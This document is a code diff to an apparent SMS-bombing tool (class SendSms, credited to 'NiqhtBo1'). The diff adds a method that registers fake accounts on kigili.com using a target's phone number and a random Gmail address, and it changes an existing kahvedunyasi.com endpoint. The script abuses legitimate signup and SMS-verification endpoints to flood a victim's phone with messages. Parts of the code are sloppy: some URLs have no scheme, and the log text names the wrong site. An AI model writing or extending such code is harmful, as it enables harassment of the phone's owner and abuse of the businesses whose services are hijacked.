@@ -13,11 +13,28 @@ class SendSms():
             self.mail = mail
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
+
+
+    def kigili(self):
+        try:
+            wmf = requests.post("https://www.kigili.com/register/", data={
+                "first_name": "memati",
+                "last_name":"bas",
+                "email": self.mail,
+                "phone": self.phone,
+                "password":"AbC123_ASD872..13FseaD"
+            })
+            if wmf.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.kahvedunyasi.com")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> www.kahvedunyasi.com")
     def kahve(self):
         try:
-            wmf = requests.post("core.kahvedunyasi.com/api/users/sms/send", data={
+            wmf = requests.post("www.kahvedunyasi.com/kayit-ol", data={
                 "mobile_number": self.phone,
-                "token_type":"register_token"
             })
             if wmf.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.kahvedunyasi.com")
